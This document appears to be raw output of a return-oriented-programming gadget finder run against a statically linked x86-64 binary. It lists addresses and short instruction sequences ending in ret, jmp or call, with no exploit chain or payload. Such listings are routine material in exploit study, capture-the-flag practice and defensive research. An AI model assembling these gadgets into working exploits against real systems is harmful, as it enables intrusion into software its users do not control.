0x000000000046a133 : clc ; add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x00000000004599db : clc ; add cl, byte ptr [rcx + 0x29] ; ret
0x0000000000465eba : clc ; add dl, byte ptr [rax - 0x77] ; ret 0xc389
0x0000000000405c45 : clc ; add dword ptr [rbx - 0x7cb70030], eax ; ret
0x000000000040f761 : clc ; add dword ptr [rdi + rcx + 0x44], eax ; ret 0xf641
0x0000000000472f28 : clc ; add ebx, dword ptr [rbp + 0x41] ; pop rsp ; ret
0x000000000041d4f7 : clc ; add rax, rcx ; ret
0x000000000041da24 : clc ; add rax, rcx ; vzeroupper ; ret
0x000000000047afba : clc ; call qword ptr [rsi]
0x000000000047b14a : clc ; call rbx
0x000000000047afce : clc ; call rsi
0x00000000004971b2 : clc ; call rsp
0x0000000000497ea8 : clc ; cli ; jmp qword ptr [rcx]
0x00000000004155d8 : clc ; cmovne rax, rcx ; ret
0x000000000041fb69 : clc ; cmp rcx, rax ; jne 0x41fb9b ; xor eax, eax ; ret
0x000000000041fb68 : clc ; cmp rcx, rax ; jne 0x41fb9c ; xor eax, eax ; ret
0x000000000047b1a2 : clc ; dec dword ptr [rax + 0x45fff8ad] ; scasb al, byte ptr [rdi] ; clc ; jmp qword ptr [rcx]
0x000000000046b380 : clc ; dec dword ptr [rax + 0xf] ; ret 0x66c3
0x0000000000415c40 : clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x0000000000476dde : clc ; dec dword ptr [rax - 0x75] ; push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x000000000040197c : clc ; dec dword ptr [rax - 0x77] ; ret
0x000000000045ce09 : clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x0000000000473d9c : clc ; dec dword ptr [rax - 0x7d] ; ret
0x00000000004580d5 : clc ; dec dword ptr [rdi] ; test byte ptr [rcx - 0x7c000015], al ; ret
0x000000000047b1a6 : clc ; inc dword ptr [rbp - 0x52] ; clc ; jmp qword ptr [rcx]
0x000000000044937a : clc ; inc dword ptr [rcx - 0x77] ; ret 0x840f
0x000000000043a52a : clc ; jg 0x43a4f9 ; mov eax, 0x80 ; pop rbx ; ret
0x000000000043a586 : clc ; jg 0x43a586 ; int1 ; mov eax, eax ; ret
0x000000000049713a : clc ; jmp qword ptr [rbx]
0x000000000047b1aa : clc ; jmp qword ptr [rcx]
0x000000000044f203 : clc ; jmp rax
0x000000000047afca : clc ; jmp rsi
0x0000000000477883 : clc ; leave ; ret
0x000000000047b146 : clc ; ljmp [rbx] ; scasb al, byte ptr [rdi] ; clc ; call rbx
0x000000000047b142 : clc ; ljmp [rbx] ; scasb al, byte ptr [rdi] ; clc ; ljmp [rbx] ; scasb al, byte ptr [rdi] ; clc ; call rbx
0x000000000049c834 : clc ; mov byte ptr [rax], al ; add byte ptr [rax], cl ; xor ebp, edi ; jmp rdx
0x0000000000490242 : clc ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x000000000040a4c4 : clc ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000421667 : clc ; mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000421fd7 : clc ; mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426f27 : clc ; mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00000000004221d7 : clc ; mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426e97 : clc ; mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00000000004223d7 : clc ; mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000426e07 : clc ; mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000421683 : clc ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043a06e : clc ; mov qword ptr [rdi], rcx ; ret
0x000000000043a1ed : clc ; mov qword ptr [rdi], rcx ; vzeroupper ; ret
0x000000000042a8bc : clc ; mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x00000000004392fa : clc ; mov qword ptr [rdi], rsi ; ret
0x0000000000477a01 : clc ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x000000000040a4dc : clc ; or ebp, edx ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000410285 : clc ; pop rbp ; pop r12 ; ret
0x000000000045e004 : clc ; push qword ptr [rax + rcx + 0x5b] ; ret
0x0000000000461b43 : clc ; push qword ptr [rdi + rax*2 - 0x77] ; ret 0xe283
0x000000000047afc6 : clc ; push rsi ; imul edi, eax, -1 ; out 0x6b, al ; clc ; call rsi
0x000000000040a4f5 : clc ; ret
0x000000000046defa : clc ; shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x0000000000460d9f : clc ; shr rax, 2 ; ret
0x000000000046d0bd : clc ; std ; jbe 0x46d0cd ; ret
0x000000000046fdd1 : clc ; sub rax, r8 ; ret
0x0000000000432f66 : clc ; sub rax, rdx ; vzeroupper ; ret
0x0000000000438f0b : clc ; sub rax, rsi ; ret
0x0000000000448cde : clc ; test rsi, rsi ; je 0x448cec ; call rsi
0x000000000041db9b : clc ; vzeroupper ; ret
0x0000000000497134 : clc ; xor dword ptr [rax], eax ; add byte ptr [rax], bh ; movsxd rdi, eax ; jmp qword ptr [rbx]
0x000000000043a48f : cld ; add eax, dword ptr [rax] ; pop rbx ; ret
0x000000000049bcfe : cld ; call qword ptr [rcx]
0x000000000047ecf6 : cld ; call rax
0x000000000048c41e : cld ; call rsp
0x000000000048c421 : cld ; cld ; jmp rsp
0x000000000043b23f : cld ; dec dword ptr [rax - 0x77] ; ret
0x000000000043a56c : cld ; inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x000000000043a4da : cld ; inc dword ptr [rbx] ; pop rbx ; ret
0x000000000047fba6 : cld ; jmp qword ptr [rax]
0x000000000047ece2 : cld ; jmp qword ptr [rbx]
0x000000000049b082 : cld ; jmp qword ptr [rcx]
0x000000000049a7ca : cld ; jmp qword ptr [rdx]
0x000000000047a620 : cld ; jmp qword ptr [rsi + 0xf]
0x000000000047fba2 : cld ; jmp rax
0x000000000047ecd6 : cld ; jmp rdi
0x000000000047ecce : cld ; jmp rdx
0x000000000048c366 : cld ; jmp rsp
0x000000000048c3aa : cld ; lcall [rbp + rdi*8 - 4] ; jmp rsp
0x000000000048c3be : cld ; lcall [rdi*8 - 0x21b0004] ; cld ; jmp rsp
0x000000000048c41a : cld ; lcall [rdi*8 - 0x32b0004] ; cld ; jmp rsp
0x000000000048c362 : cld ; ljmp [rbp + rdi*8 - 4] ; jmp rsp
0x000000000048c376 : cld ; ljmp [rbp + rdi*8 - 4] ; ljmp [rbp + rdi*8 - 4] ; jmp rsp
0x0000000000421df2 : cld ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000421ff5 : cld ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004221f5 : cld ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004223f5 : cld ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043a076 : cld ; mov dword ptr [rdi], ecx ; ret
0x000000000043a1f8 : cld ; mov dword ptr [rdi], ecx ; vzeroupper ; ret
0x000000000042a8ce : cld ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x0000000000439308 : cld ; mov dword ptr [rdi], esi ; ret
0x0000000000439302 : cld ; mov esi, dword ptr [rsi] ; mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x0000000000421a26 : cld ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004270b6 : cld ; mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421c06 : cld ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000427036 : cld ; mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421de6 : cld ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000426fb6 : cld ; mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421846 : cld ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000427136 : cld ; mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004216d1 : cld ; ret
0x000000000048f6f6 : cld ; test al, 0x97 ; xchg eax, esp ; ret
0x0000000000439b92 : cld ; vzeroupper ; ret
0x0000000000456b85 : cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x0000000000409402 : cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x000000000043a061 : cli ; add dword ptr [rdi + 0x15], esi ; jb 0x43a071 ; mov byte ptr [rdi], cl ; ret
0x000000000043905b : cli ; add dword ptr [rdx + 2], esi ; mov byte ptr [rdi], cl ; ret
0x000000000042a8ec : cli ; add dword ptr [rdx + 4], esi ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000043af93 : cli ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x000000000043aff4 : cli ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x000000000047cdfa : cli ; call qword ptr [rax + 0x20fffaab]
0x000000000047d2f2 : cli ; call qword ptr [rax + 0x20fffad2]
0x000000000047cdda : cli ; call qword ptr [rax]
0x000000000047c902 : cli ; call qword ptr [rbx]
0x000000000049816a : cli ; call qword ptr [rcx]
0x000000000047d0d2 : cli ; call qword ptr [rdx + 0x22fffa9e]
0x000000000047cec2 : cli ; call qword ptr [rdx + 0x22fffaaa]
0x000000000047d3ba : cli ; call qword ptr [rdx + 0x22fffad1]
0x000000000047cea2 : cli ; call qword ptr [rdx]
0x000000000047ce1e : cli ; call qword ptr [rsi + 0x26fffaae]
0x000000000047ce3e : cli ; call qword ptr [rsi]
0x000000000047d72e : cli ; call rax
0x000000000047c90e : cli ; call rbx
0x000000000047ced2 : cli ; call rdx
0x000000000047ce2e : cli ; call rsi
0x000000000047cd66 : cli ; call rsp
0x000000000043df05 : cli ; cmp eax, 0x83491774 ; ret
0x00000000004514f6 : cli ; dec dword ptr [rax + 0x29] ; ret
0x000000000045f190 : cli ; dec dword ptr [rax + 1] ; ret
0x000000000045e557 : cli ; dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x000000000047d2fe : cli ; inc dword ptr [rax - 0x2f] ; cli ; call rax
0x000000000047ce06 : cli ; inc dword ptr [rax - 0x56] ; cli ; call rax
0x000000000047d016 : cli ; inc dword ptr [rax - 0x62] ; cli ; jmp rsi
0x000000000047d73a : cli ; inc dword ptr [rax] ; int1 ; cli ; call qword ptr [rax]
0x000000000047cdf6 : cli ; inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; cli ; call qword ptr [rax + 0x20fffaab]
0x000000000047d2ee : cli ; inc dword ptr [rax] ; sar edx, cl ; call qword ptr [rax + 0x20fffad2]
0x000000000047d25a : cli ; inc dword ptr [rbp + rdx*8 - 6] ; call rsp
0x000000000047d3c6 : cli ; inc dword ptr [rdx - 0x30] ; cli ; call rdx
0x000000000047cece : cli ; inc dword ptr [rdx - 0x57] ; cli ; call rdx
0x000000000047d3b6 : cli ; inc dword ptr [rdx] ; sar dl, cl ; call qword ptr [rdx + 0x22fffad1]
0x000000000047cebe : cli ; inc dword ptr [rdx] ; stosd dword ptr [rdi], eax ; cli ; call qword ptr [rdx + 0x22fffaaa]
0x000000000047d48a : cli ; inc dword ptr [rsi + rax*8] ; cli ; push qword ptr [rbp + rax*8 - 6] ; jmp rsp
0x000000000047cd62 : cli ; inc dword ptr [rsi + rbp*4 - 6] ; call rsp
0x000000000047d322 : cli ; inc dword ptr [rsi - 0x2c] ; cli ; call rsi
0x000000000047ce2a : cli ; inc dword ptr [rsi - 0x53] ; cli ; call rsi
0x000000000047ce1a : cli ; inc dword ptr [rsi] ; scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rsi + 0x26fffaae]
0x000000000047ce4a : cli ; inc esi ; test eax, 0xa956fffa ; cli ; jmp rsi
0x000000000042a8a7 : cli ; jg 0x42a8ba ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x0000000000439026 : cli ; jg 0x439038 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x0000000000439659 : cli ; jg 0x43966c ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000439ac1 : cli ; jg 0x439ad4 ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000043a1e2 : cli ; jg 0x43a1f2 ; vzeroupper ; ret
0x000000000043a3b8 : cli ; jg 0x43a3c8 ; vzeroupper ; ret
0x000000000047cdd6 : cli ; jmp qword ptr [rax + 0x10fffaa8]
0x000000000047cdfe : cli ; jmp qword ptr [rax]
0x0000000000497b72 : cli ; jmp qword ptr [rcx]
0x00000000004981fa : cli ; jmp qword ptr [rdi]
0x000000000047d396 : cli ; jmp qword ptr [rdx + 0x12ffface]
0x000000000047cec6 : cli ; jmp qword ptr [rdx]
0x000000000047c896 : cli ; jmp qword ptr [rsi]
0x000000000047cdee : cli ; jmp rax
0x000000000049772e : cli ; jmp rbx
0x00000000004059e4 : cli ; jmp rdx
0x000000000047ce52 : cli ; jmp rsi
0x000000000047cd8a : cli ; jmp rsp
0x000000000047d24e : cli ; lcall [rsi + 0x2efffacf] ; iretd ; cli ; call rsp
0x000000000047d092 : cli ; lcall [rsi + rbx*4 - 0x61d30006] ; cli ; call rdx
0x000000000047d4d6 : cli ; ljmp [rdx - 0x3c] ; cli ; call qword ptr [rax]
0x000000000047d096 : cli ; ljmp [rsi + rbx*4] ; cli ; call rdx
0x000000000047d252 : cli ; ljmp [rsi] ; iretd ; cli ; call rsp
0x00000000004221f8 : cli ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000405cc6 : cli ; movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x000000000041dea8 : cli ; movzx edx, dl ; sub eax, edx ; ret
0x000000000041c956 : cli ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004004ca : cli ; or ebp, dword ptr [rdx] ; add byte ptr [rsi - 0x70], ah ; ret
0x0000000000491b61 : cli ; push 0x6e ; ja 0x491aee ; ret 0x48f
0x000000000047d012 : cli ; push qword ptr [rax + 0x40fffa9e] ; sahf ; cli ; jmp rsi
0x000000000047ce02 : cli ; push qword ptr [rax + 0x40fffaaa] ; stosb byte ptr [rdi], al ; cli ; call rax
0x000000000047d2fa : cli ; push qword ptr [rax + 0x40fffad1] ; sar edx, 1 ; call rax
0x000000000047cfde : cli ; push qword ptr [rax - 0x5b] ; cli ; jmp rax
0x000000000047cf86 : cli ; push qword ptr [rax - 6] ; jmp rsp
0x000000000047d746 : cli ; push qword ptr [rax] ; idiv edx ; call rax
0x000000000047d48e : cli ; push qword ptr [rbp + rax*8 - 6] ; jmp rsp
0x000000000047c90a : cli ; push qword ptr [rbx] ; xor edx, edi ; call rbx
0x000000000047d3c2 : cli ; push qword ptr [rdx + 0x42fffad0] ; sar dl, 1 ; call rdx
0x000000000047d59e : cli ; push qword ptr [rdx - 0x35] ; cli ; jmp rdx
0x000000000047ce26 : cli ; push qword ptr [rsi + 0x46fffaad] ; lodsd eax, dword ptr [rsi] ; cli ; call rsi
0x000000000047cd5e : cli ; push qword ptr [rsi + rbp*4 - 0x51bb0006] ; cli ; call rsp
0x000000000047d546 : cli ; push qword ptr [rsi - 0x3a] ; cli ; jmp rsi
0x000000000047cfda : cli ; push rax ; movsd dword ptr [rdi], dword ptr [rsi] ; cli ; push qword ptr [rax - 0x5b] ; cli ; jmp rax
0x000000000047d736 : cli ; push rax ; out dx, al ; cli ; inc dword ptr [rax] ; int1 ; cli ; call qword ptr [rax]
0x000000000047d59a : cli ; push rdx ; retf ; cli ; push qword ptr [rdx - 0x35] ; cli ; jmp rdx
0x0000000000439f99 : cli ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x0000000000490605 : cli ; ret 0xac65
0x000000000043d9ab : cli ; setae al ; ret
0x00000000004142d3 : cli ; sub byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000047cdd4 : cli ; test al, 0xfa ; jmp qword ptr [rax + 0x10fffaa8]
0x0000000000432d99 : cli ; test rdx, rdx ; je 0x432db9 ; bsf rax, rdx ; ret
0x0000000000460038 : cli ; test rdx, rdx ; je 0x460069 ; bsf rax, rdx ; ret
0x000000000048f24a : cli ; xchg dword ptr [rsp + rax + 0x6fa9ce9d], esp ; ret
0x0000000000476ddd : cmc ; clc ; dec dword ptr [rax - 0x75] ; push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x00000000004993f9 : cmc ; cli ; call rbx
0x000000000047d745 : cmc ; cli ; push qword ptr [rax] ; idiv edx ; call rax
0x0000000000446cf7 : cmc ; lodsb al, byte ptr [rsi] ; sti ; inc dword ptr [rcx - 0x77] ; ret 0x17e9
0x0000000000491f89 : cmc ; mov ch, 0xab ; ret
0x000000000042703a : cmc ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421a7e : cmc ; mov dword ptr [rdi - 4], edx ; ret
0x000000000045cec7 : cmc ; mov rbp, rax ; jmp 0x45ce94
0x00000000004383e3 : cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x000000000048ee37 : cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x0000000000464bf7 : cmc ; ret 0x23
0x00000000004383e7 : cmc ; sub eax, edx ; ret
0x00000000004915c5 : cmc ; xlatb ; ret 0x4e27
0x000000000040f579 : cmovae eax, dword ptr [rdi + 0x10] ; sub rax, qword ptr [rdi + 0x18] ; ret
0x000000000040f578 : cmovae rax, qword ptr [rdi + 0x10] ; sub rax, qword ptr [rdi + 0x18] ; ret
0x000000000046a2a1 : cmove eax, eax ; mov rax, r8 ; pop rbx ; ret
0x000000000043a4b4 : cmove eax, ecx ; pop rbx ; ret
0x000000000045e7f1 : cmove eax, ecx ; ret
0x0000000000415c43 : cmove eax, edx ; add rsp, 8 ; ret
0x000000000043a47c : cmove eax, edx ; pop rbx ; ret
0x0000000000415d7f : cmove eax, edx ; ret
0x000000000040c1af : cmove ebp, esp ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046a2a0 : cmove r8, rax ; mov rax, r8 ; pop rbx ; ret
0x000000000045e7f0 : cmove r8, rcx ; ret
0x000000000043a4b3 : cmove rax, rcx ; pop rbx ; ret
0x0000000000415c42 : cmove rax, rdx ; add rsp, 8 ; ret
0x000000000043a47b : cmove rax, rdx ; pop rbx ; ret
0x0000000000415d7e : cmove rax, rdx ; ret
0x000000000040d2db : cmovg eax, ecx ; test rdx, rdx ; jne 0x40d2d9 ; ret
0x000000000045dabb : cmovg eax, ecx ; test rdx, rdx ; jne 0x45dab9 ; ret
0x00000000004155da : cmovne eax, ecx ; ret
0x000000000043a50c : cmovne eax, edx ; pop rbx ; ret
0x0000000000415c7f : cmovne eax, edx ; ret
0x0000000000432924 : cmovne eax, edx ; vzeroupper ; ret
0x00000000004155d9 : cmovne rax, rcx ; ret
0x000000000043a50b : cmovne rax, rdx ; pop rbx ; ret
0x0000000000415c7e : cmovne rax, rdx ; ret
0x0000000000432923 : cmovne rax, rdx ; vzeroupper ; ret
0x000000000044238c : cmovs eax, edx ; ret
0x0000000000477ef8 : cmovs ecx, dword ptr [rcx + 0x1bffe] ; add byte ptr [rax], al ; jmp rax
0x000000000045e618 : cmovs edi, dword ptr [rcx] ; int1 ; jne 0x45e619 ; lea eax, [rdx + rdi] ; ret
0x000000000043a45e : cmovs esp, dword ptr [rbx + 0xc] ; xchg byte ptr [rax + 1], cl ; int1 ; jmp rcx
0x000000000043a4f0 : cmovs esp, dword ptr [rbx + 4] ; xchg eax, esi ; add rax, rsi ; jmp rax
0x0000000000438ef8 : cmp ah, byte ptr [rbx - 0x27] ; add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x0000000000497b6d : cmp al, 0 ; add byte ptr [rax + 0x3b], dh ; cli ; jmp qword ptr [rcx]
0x000000000046c397 : cmp al, 0 ; add byte ptr [rcx - 0x77], cl ; ret
0x0000000000441302 : cmp al, 0x24 ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x000000000040d4a7 : cmp al, 0x24 ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000047804d : cmp al, 0x24 ; mov rdx, qword ptr [rbp] ; call r12
0x0000000000462336 : cmp al, 0x2f ; je 0x462327 ; xor eax, eax ; ret
0x000000000040f725 : cmp al, 0x30 ; ret
0x000000000047751c : cmp al, 0x31 ; or byte ptr [rbp + 4], dh ; mov qword ptr [rax], rdx ; ret
0x00000000004774ad : cmp al, 0x32 ; or byte ptr [rbp + 0x1a], dh ; mov rax, qword ptr [rax] ; ret
0x0000000000490240 : cmp al, 0x46 ; clc ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x000000000049c578 : cmp al, 0x86 ; add byte ptr [rax], al ; je 0x49c5a5 ; std ; call rdi
0x0000000000405cc9 : cmp al, 0xba ; add rdi, r10 ; jmp rdi
0x000000000046c7d8 : cmp al, 0xf9 ; dec dword ptr [rax - 0x77] ; ret
0x00000000004388a6 : cmp al, byte ptr [rsi - 1] ; jne 0x4388cc ; xor eax, eax ; ret
0x000000000041d716 : cmp al, dh ; ret
0x000000000041d715 : cmp al, r14b ; ret
0x0000000000475296 : cmp bh, 0x10 ; jne 0x4752bf ; xor eax, eax ; ret
0x0000000000478436 : cmp bh, 0x10 ; jne 0x478455 ; xor eax, eax ; ret
0x0000000000479296 : cmp bh, 0x10 ; jne 0x4792b5 ; xor eax, eax ; ret
0x0000000000479d06 : cmp bh, 0x10 ; jne 0x479d2f ; xor eax, eax ; ret
0x000000000047841c : cmp bh, 0x30 ; jne 0x478451 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000047927c : cmp bh, 0x30 ; jne 0x4792b1 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000047d7e9 : cmp bh, bl ; jmp qword ptr [rax]
0x000000000043c9c6 : cmp bl, byte ptr [rbx + 0x5d] ; ret
0x00000000004087f2 : cmp byte ptr [r8 - 0x75], cl ; push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x000000000040a066 : cmp byte ptr [rax + 0x29], cl ; ret
0x00000000004084be : cmp byte ptr [rax + 0x39], cl ; ret
0x000000000040ad69 : cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x000000000040ac57 : cmp byte ptr [rax + 0x39], cl ; ret 0x4b74
0x000000000040159b : cmp byte ptr [rax + 0x39], cl ; ret 0x4f76
0x000000000041d757 : cmp byte ptr [rax + 1], cl ; clc ; ret
0x000000000045d47d : cmp byte ptr [rax + 1], cl ; ret
0x000000000045d060 : cmp byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x39], cl ; ret 0xf48
0x00000000004441b1 : cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00000000004087f3 : cmp byte ptr [rax - 0x75], cl ; push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x000000000045ce06 : cmp byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x000000000041d746 : cmp byte ptr [rax], ah ; ret
0x0000000000497765 : cmp byte ptr [rax], al ; add byte ptr [rax + 0x29], bh ; cli ; call qword ptr [rbx]
0x000000000049773d : cmp byte ptr [rax], al ; add byte ptr [rax + 0x29], dl ; cli ; call qword ptr [rdx]
0x000000000040d783 : cmp byte ptr [rax], al ; je 0x40d795 ; ret
0x000000000047741f : cmp byte ptr [rax], al ; je 0x477448 ; add rsp, 0x18 ; ret
0x00000000004324c0 : cmp byte ptr [rax], dh ; cmovne rax, rdx ; ret
0x000000000041d736 : cmp byte ptr [rax], dl ; ret
0x000000000041d735 : cmp byte ptr [rax], r10b ; ret
0x000000000041d745 : cmp byte ptr [rax], r12b ; ret
0x00000000004324bf : cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x000000000049bf11 : cmp byte ptr [rbx + 0x2030d07], al ; cld ; ret
0x000000000049bf45 : cmp byte ptr [rbx + 0x2030d07], al ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000049bedd : cmp byte ptr [rbx + 0x3030d07], al ; or al, byte ptr [rcx] ; ret
0x0000000000474f38 : cmp byte ptr [rbx + 0x41], bl ; pop rsi ; ret
0x0000000000406216 : cmp byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x000000000040cf70 : cmp byte ptr [rbx + 0x5d], bl ; ret
0x0000000000497138 : cmp byte ptr [rbx - 8], ah ; jmp qword ptr [rbx]
0x000000000047ece0 : cmp byte ptr [rbx], al ; cld ; jmp qword ptr [rbx]
0x000000000047eccc : cmp byte ptr [rbx], al ; cld ; jmp rdx
0x000000000047751b : cmp byte ptr [rcx + rsi], 8 ; jne 0x47752e ; mov qword ptr [rax], rdx ; ret
0x000000000046baf6 : cmp byte ptr [rcx - 0x7d], cl ; ret 0x4908
0x000000000047d7e4 : cmp byte ptr [rcx], 0xfb ; call rax
0x0000000000497ebc : cmp byte ptr [rdi], 0 ; add byte ptr [rax], dl ; cli ; jmp qword ptr [rcx]
0x000000000040d748 : cmp byte ptr [rdi], cl ; ret 0x389
0x000000000041f03d : cmp byte ptr [rdi], dl ; ret
0x000000000041fb50 : cmp byte ptr [rdi], dl ; ret 0x2373
0x000000000041fb39 : cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000041fb22 : cmp byte ptr [rdi], dl ; ret 0x5173
0x000000000041e5de : cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004774ac : cmp byte ptr [rdx + rsi], 8 ; jne 0x4774d5 ; mov rax, qword ptr [rax] ; ret
0x000000000047d1d0 : cmp byte ptr [rsi - 0x68470006], dl ; cli ; jmp rsi
0x000000000047e758 : cmp ch, bh ; sti ; call qword ptr [rax]
0x000000000040fcb2 : cmp cl, byte ptr [rax - 0x75] ; push rax ; or dh, dh ; ret 0x7502
0x0000000000432921 : cmp dh, byte ptr [rax] ; cmovne rax, rdx ; vzeroupper ; ret
0x000000000043a39a : cmp dh, byte ptr [rdx + 2] ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x0000000000475295 : cmp dil, 0x10 ; jne 0x4752c0 ; xor eax, eax ; ret
0x0000000000478435 : cmp dil, 0x10 ; jne 0x478456 ; xor eax, eax ; ret
0x0000000000479295 : cmp dil, 0x10 ; jne 0x4792b6 ; xor eax, eax ; ret
0x0000000000479d05 : cmp dil, 0x10 ; jne 0x479d30 ; xor eax, eax ; ret
0x000000000043a060 : cmp dl, 1 ; ja 0x43a083 ; jb 0x43a072 ; mov byte ptr [rdi], cl ; ret
0x000000000042a8eb : cmp dl, 1 ; jb 0x42a8fd ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000043905a : cmp dl, 1 ; jb 0x439068 ; mov byte ptr [rdi], cl ; ret
0x0000000000415645 : cmp dl, al ; jne 0x415638 ; sub rax, 0x10 ; ret
0x000000000047e010 : cmp dl, bh ; sti ; jmp qword ptr [rsi]
0x0000000000415644 : cmp dl, r8b ; jne 0x415639 ; sub rax, 0x10 ; ret
0x0000000000406fc1 : cmp dword ptr [rax - 0x39], ecx ; ret
0x0000000000426b78 : cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x0000000000451783 : cmp dword ptr [rcx + 0xf660003], ebp ; outsd dx, dword ptr [rsi] ; ret 0x290f
0x000000000044492d : cmp dword ptr [rcx - 0xa], eax ; ret 0xf08
0x000000000040d781 : cmp dword ptr [rdi + 0x38], 0 ; je 0x40d797 ; ret
0x0000000000416921 : cmp dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000045dfe8 : cmp dword ptr [rsi + 0x30], 0 ; je 0x45dff7 ; ret
0x000000000046b37f : cmp eax, -1 ; cmove rax, rdx ; ret
0x000000000045e003 : cmp eax, -1 ; je 0x45e016 ; pop rbx ; ret
0x000000000046d0bc : cmp eax, -3 ; jbe 0x46d0ce ; ret
0x0000000000447f79 : cmp eax, 0x20c48348 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040a442 : cmp eax, 0x296b70 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x0000000000403113 : cmp eax, 0x29de5f ; add byte ptr [rax - 0x77], cl ; ret
0x000000000047d7f1 : cmp eax, 0x3ec0fffb ; sti ; call qword ptr [rax]
0x00000000004139e4 : cmp eax, 0x67d4f ; call 0x40fc87
0x000000000043df06 : cmp eax, 0x83491774 ; ret
0x000000000045fdb4 : cmp eax, 0x89000001 ; ret 0x8948
0x000000000046c2d0 : cmp eax, 0x89490000 ; ret
0x000000000043b776 : cmp eax, 0xfffff000 ; ja 0x43b788 ; ret
